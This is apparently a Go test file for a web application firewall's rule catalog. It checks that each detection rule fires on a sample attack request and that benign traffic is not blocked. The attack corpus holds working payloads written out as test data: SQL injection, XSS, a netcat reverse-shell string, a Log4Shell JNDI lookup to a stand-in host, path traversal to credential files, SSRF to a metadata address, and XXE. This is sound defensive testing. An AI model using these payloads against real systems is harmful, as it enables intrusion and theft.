package catalog

import (
	"strings"
	"testing"

	"github.com/jackby03/waffynx/internal/policy"
)

func mustLoad(t *testing.T) *Catalog {
	t.Helper()
	c, err := Embedded()
	if err != nil {
		t.Fatalf("embedded catalog does not load: %v", err)
	}
	return c
}

// attackCase is one request that must hit one specific rule.
type attackCase struct {
	ruleID string
	method string
	path   string
	body   string
	ua     string
}

// attacks is the positive corpus. TestEveryRuleIsTested fails when a rule in
// catalog.yaml has no case here, so the ruleset and its tests cannot drift.
var attacks = []attackCase{
	{ruleID: "WAF-SQLI-001", path: "/?q=UNION+SELECT+1,2,3"},
	{ruleID: "WAF-SQLI-001", path: "/?q=union/**/select"},
	{ruleID: "WAF-SQLI-001", path: "/?q=union%20all%20select"},
	{ruleID: "WAF-SQLI-002", path: "/login?user=admin&pass=' or '1'='1"},
	{ruleID: "WAF-SQLI-003", path: "/p?id=1 AND sleep(5)"},
	{ruleID: "WAF-SQLI-004", path: "/login?user=admin'--"},
	{ruleID: "WAF-SQLI-005", path: "/p?q=1;select"},
	{ruleID: "WAF-SQLI-006", path: "/p?id=1 UNION information_schema.tables"},
	{ruleID: "WAF-SQLI-007", path: "/p?id=char(0x27)"},
	{ruleID: "WAF-SQLI-008", path: "/", ua: "sqlmap/1.7.2"},
	{ruleID: "WAF-SQLI-009", path: "/p?sort=order by 1"},
	{ruleID: "WAF-XSS-001", path: "/?q=<script>alert(1)</script>"},
	{ruleID: "WAF-XSS-002", path: "/?q=<img src=x onerror=alert(1)>"},
	{ruleID: "WAF-XSS-003", path: "/?next=javascript:alert(1)"},
	{ruleID: "WAF-XSS-004", path: "/?d=data:text/html;base64,PHNjcmlwdD4="},
	{ruleID: "WAF-XSS-005", path: "/?h=<iframe srcdoc=1>"},
	{ruleID: "WAF-XSS-006", path: "/?s=document.cookie"},
	{ruleID: "WAF-XSS-007", path: "/?s=alert(1)"},
	{ruleID: "WAF-XSS-008", path: "/?s=<svg>"},
	{ruleID: "WAF-RCE-001", path: "/?c=1;cat /etc/hosts"},
	{ruleID: "WAF-RCE-002", path: "/?c=ls|sh"},
	{ruleID: "WAF-RCE-003", path: "/?c=;whoami"},
	{ruleID: "WAF-RCE-004", path: "/?c=nc -e /bin/sh 1.2.3.4 9001"},
	{ruleID: "WAF-RCE-005", path: "/?c=powershell -enc AAAA"},
	{ruleID: "WAF-RCE-006", path: "/?c=cmd /c dir"},
	{ruleID: "WAF-RCE-007", path: "/", ua: "${jndi:ldap://evil/a}"},
	{ruleID: "WAF-RCE-008", path: "/?c=os.system('id')"},
	{ruleID: "WAF-LFI-001", path: "/download?f=../../etc/passwd"},
	{ruleID: "WAF-LFI-002", path: "/download?f=..;/..;/etc/passwd"},
	{ruleID: "WAF-LFI-003", path: "/download?f=/etc/shadow"},
	{ruleID: "WAF-LFI-004", path: "/download?f=php://filter/resource=index"},
	{ruleID: "WAF-LFI-005", path: "/download?f=c:\\windows\\win.ini"},
	{ruleID: "WAF-SENS-001", path: "/.git/config"},
	{ruleID: "WAF-SENS-002", path: "/db/backup.sql"},
	{ruleID: "WAF-SENS-003", path: "/phpinfo.php"},
	{ruleID: "WAF-SSRF-001", path: "/fetch?url=http://169.254.169.254/latest"},
	{ruleID: "WAF-SSRF-002", path: "/fetch?url=file://localhost/tmp/x"},
	{ruleID: "WAF-SSRF-003", path: "/fetch?url=http://127.0.0.1:8080/"},
	{ruleID: "WAF-XXE-001", method: "POST", path: "/api/xml", body: `<?xml version="1.0"?><!ENTITY xxe SYSTEM "file:///tmp/x">`},
	{ruleID: "WAF-SCAN-001", path: "/", ua: "Nikto/2.5.0"},
	{ruleID: "WAF-PROTO-001", path: "/file.php%00.jpg"},
	{ruleID: "WAF-PROTO-002", path: "/?next=%0d%0aSet-Cookie:admin=1"},
	{ruleID: "WAF-PROTO-003", path: "/?q=%252e%252e%252f"},
	{ruleID: "WAF-PROTO-004", method: "POST", path: "/graphql", body: `{"query":"{ __schema { types { name } } }"}`},
}

func reqFor(tc attackCase) *policy.Request {
	headers := map[string][]string{}
	if tc.ua != "" {
		headers["User-Agent"] = []string{tc.ua}
	}
	method := tc.method
	if method == "" {
		method = "GET"
	}
	return &policy.Request{
		Method:  method,
		Host:    "app.example.com",
		Path:    tc.path,
		Body:    []byte(tc.body),
		Headers: headers,
	}
}

// TestEveryRuleIsTested is the guard against a catalog that grows untested.
func TestEveryRuleIsTested(t *testing.T) {
	c := mustLoad(t)

	covered := map[string]bool{}
	for _, tc := range attacks {
		covered[tc.ruleID] = true
	}

	for _, r := range c.Rules {
		if !covered[r.ID] {
			t.Errorf("rule %s (%s) has no positive test in attacks[]", r.ID, r.Name)
		}
	}
}

func TestCatalogDetectsAttacks(t *testing.T) {
	c := mustLoad(t)

	for _, tc := range attacks {
		t.Run(tc.ruleID+"/"+tc.path, func(t *testing.T) {
			hit := c.Evaluate(reqFor(tc))
			if hit == nil {
				t.Fatalf("no rule matched %q (body %q, ua %q)", tc.path, tc.body, tc.ua)
			}
			if hit.RuleID != tc.ruleID {
				t.Fatalf("matched %s, want %s", hit.RuleID, tc.ruleID)
			}
			if hit.Severity == "" || hit.Action == "" || hit.Field == "" {
				t.Errorf("incomplete hit: %+v", hit)
			}
		})
	}
}

// Encoded variants of the same attack must reach the same rule.
func TestCatalogDecodesEncodings(t *testing.T) {
	c := mustLoad(t)

	cases := []struct{ name, path, body string }{
		{"query plus", "/?q=UNION+SELECT+1", ""},
		{"query percent", "/?q=UNION%20SELECT%201", ""},
		{"query double-encoded lowercase", "/?q=union%2F**%2Fselect", ""},
		{"body form", "/", "q=union+select+1"},
		{"body json escape", "/", `{"q":"\u003cscript\u003ealert(1)\u003c/script\u003e"}`},
		{"body html entity", "/", "q=&lt;script&gt;alert(1)&lt;/script&gt;"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			hit := c.Evaluate(&policy.Request{Method: "POST", Path: tc.path, Body: []byte(tc.body)})
			if hit == nil {
				t.Fatalf("%s was not detected", tc.name)
			}
			if hit.Action != ActionBlock {
				t.Errorf("expected a blocking rule, got %s (%s)", hit.RuleID, hit.Action)
			}
		})
	}
}

// benign is the corpus that must never be blocked. Log-only rules may fire on
// prose (that is what "log" is for); a block here is a false positive and a
// support ticket.
var benign = []struct{ name, method, path, body, ua string }{
	{"root", "GET", "/", "", ""},
	{"pagination", "GET", "/api/users?page=2&limit=50", "", ""},
	{"prose query", "GET", "/search?q=how+to+bake+bread", "", ""},
	{"restful path", "GET", "/products/nike-air-max-90", "", ""},
	{"date range", "GET", "/api/v1/reports?from=2026-01-01&to=2026-02-01", "", ""},
	{"json body", "POST", "/api/orders", `{"items":[{"sku":"A-1","qty":2}]}`, ""},
	{"arithmetic and phone", "POST", "/api/v2/calc", `{"expr":"1+1=2","phone":"+34912345678"}`, ""},
	{"percent in prose", "POST", "/api/v2/notes", `{"discount":"100%","note":"50% off"}`, ""},
	{"apostrophe in prose", "GET", "/blog/why-waf-matters", "", ""},
	{"browser user agent", "GET", "/", "", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/130.0"},
	{"file download", "GET", "/files/report-2026.pdf", "", ""},
	{"oauth callback", "GET", "/auth/callback?code=abc123&state=xyz", "", ""},
	{"sql word in prose", "POST", "/api/v2/docs", `{"title":"Select the union representative"}`, ""},
}

func TestCatalogDoesNotBlockBenignTraffic(t *testing.T) {
	c := mustLoad(t)

	for _, tc := range benign {
		t.Run(tc.name, func(t *testing.T) {
			req := &policy.Request{Method: tc.method, Path: tc.path, Body: []byte(tc.body)}
			if tc.ua != "" {
				req.Headers = map[string][]string{"User-Agent": {tc.ua}}
			}
			hit := c.Evaluate(req)
			if hit == nil {
				return
			}
			if hit.Action == ActionBlock {
				t.Fatalf("benign request blocked by %s (%s) on field %s: %s",
					hit.RuleID, hit.Name, hit.Field, tc.path)
			}
			t.Logf("log-only rule %s fired, which is expected for noisy signatures", hit.RuleID)
		})
	}
}

func TestEvaluateHandlesMissingQuery(t *testing.T) {
	c := mustLoad(t)
	hit := c.Evaluate(&policy.Request{Method: "GET", Path: "/"})
	if hit != nil {
		t.Errorf("unexpected hit on a bare path: %+v", hit)
	}
}

func TestEvaluateNilRequest(t *testing.T) {
	if hit := mustLoad(t).Evaluate(nil); hit != nil {
		t.Errorf("nil request must not match: %+v", hit)
	}
}

func TestLoadRejectsInvalidCatalogs(t *testing.T) {
	cases := []struct{ name, yaml string }{
		{"no version", "rules:\n  - id: A\n    name: n\n    severity: low\n    action: log\n    any_of: [x]\n"},
		{"no rules", "version: 1\n"},
		{
			"unknown field",
			"version: 1\nrules:\n  - id: A\n    name: n\n    severity: low\n    action: log\n    any_of: [x]\n    pattern: [y]\n",
		},
		{
			"duplicate id",
			"version: 1\nrules:\n  - id: A\n    name: n\n    severity: low\n    action: log\n    any_of: [x]\n  - id: A\n    name: n\n    severity: low\n    action: log\n    any_of: [y]\n",
		},
		{
			"bad severity",
			"version: 1\nrules:\n  - id: A\n    name: n\n    severity: urgent\n    action: log\n    any_of: [x]\n",
		},
		{
			"bad action",
			"version: 1\nrules:\n  - id: A\n    name: n\n    severity: low\n    action: drop\n    any_of: [x]\n",
		},
		{
			"empty any_of",
			"version: 1\nrules:\n  - id: A\n    name: n\n    severity: low\n    action: log\n",
		},
		{
			"bad field",
			"version: 1\nrules:\n  - id: A\n    name: n\n    severity: low\n    action: log\n    fields: [cookie]\n    any_of: [x]\n",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := Load([]byte(tc.yaml)); err == nil {
				t.Fatal("invalid catalog accepted")
			}
		})
	}
}

func TestNormalizeEncodings(t *testing.T) {
	cases := []struct{ in, want string }{
		{"UNION+SELECT", "unionselect"},
		{"UNION%20SELECT", "unionselect"},
		{"union/**/select", "unionselect"},
		// The closing marker is left behind on purpose: matching is substring-based,
		// so "unionselect*/" still contains "unionselect".
		{"union/*!50000select*/", "unionselect*/"},
		{"UNION\tALL\nSELECT", "unionallselect"},
		{"%3Cscript%3E", "<script>"},
		{"&lt;script&gt;", "<script>"},
		{`\u003cscript\u003e`, "<script>"},
		{"admin'--", "admin'--"},
		{"1+1=2", "11=2"},
		{"%zz malformed", "%zzmalformed"},
	}

	for _, tc := range cases {
		if got := Normalize(tc.in, true); got != tc.want {
			t.Errorf("Normalize(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}

	// Undecoded mode only lowercases, which is what matches a raw user-agent.
	if got := Normalize("Nikto/2.5", false); got != "nikto/2.5" {
		t.Errorf("undecoded Normalize = %q", got)
	}
}

// FuzzEvaluate asserts the matcher never panics on hostile input: it is in the
// request path, where a panic is a failed request.
func FuzzEvaluate(f *testing.F) {
	c, err := Embedded()
	if err != nil {
		f.Fatalf("embedded catalog: %v", err)
	}

	f.Add("GET", "/?q=union+select", "")
	f.Add("POST", "/", `{"q":"\u003cscript\u003e"}`)
	f.Add("", "", "")
	f.Add("GET", "/%00%zz%25", "%%%")

	f.Fuzz(func(t *testing.T, method, path, body string) {
		req := &policy.Request{Method: method, Path: path, Body: []byte(body)}
		_ = c.Evaluate(req)
	})
}

func BenchmarkEvaluate(b *testing.B) {
	c, err := Embedded()
	if err != nil {
		b.Fatalf("embedded catalog: %v", err)
	}
	req := &policy.Request{
		Method: "GET",
		Path:   "/api/users?page=2&limit=50&sort=name",
		Body:   []byte(`{"items":[{"sku":"A-1","qty":2}]}`),
	}

	// Warm the scratch pool: the first call allocates it, and without this the
	// reported allocs/op measure the pool filling rather than the steady state.
	_ = c.Evaluate(req)

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if hit := c.Evaluate(req); hit != nil {
			b.Fatalf("benign request matched %s", hit.RuleID)
		}
	}
}

func TestCatalogVersionAndTags(t *testing.T) {
	c := mustLoad(t)
	if c.Version < 1 {
		t.Errorf("version = %d", c.Version)
	}
	if c.Count() < 40 {
		t.Errorf("catalog has %d rules, expected the shipped set", c.Count())
	}
	for _, r := range c.Rules {
		if len(r.Tags) == 0 {
			t.Errorf("%s has no tags; events would be impossible to group", r.ID)
		}
	}
	if strings.TrimSpace(c.Rules[0].ID) == "" {
		t.Error("first rule has no id")
	}
}

// BenchmarkEvaluateLargeBody measures the worst case the module allows: a body at
// the inspection cap, scanned by every rule.
func BenchmarkEvaluateLargeBody(b *testing.B) {
	c, err := Embedded()
	if err != nil {
		b.Fatalf("embedded catalog: %v", err)
	}
	body := make([]byte, 64<<10)
	for i := range body {
		body[i] = 'a'
	}
	req := &policy.Request{Method: "POST", Path: "/api/upload", Body: body}
	_ = c.Evaluate(req)

	b.ReportAllocs()
	b.ResetTimer()
	b.SetBytes(int64(len(body)))
	for i := 0; i < b.N; i++ {
		if hit := c.Evaluate(req); hit != nil {
			b.Fatalf("benign body matched %s", hit.RuleID)
		}
	}
}
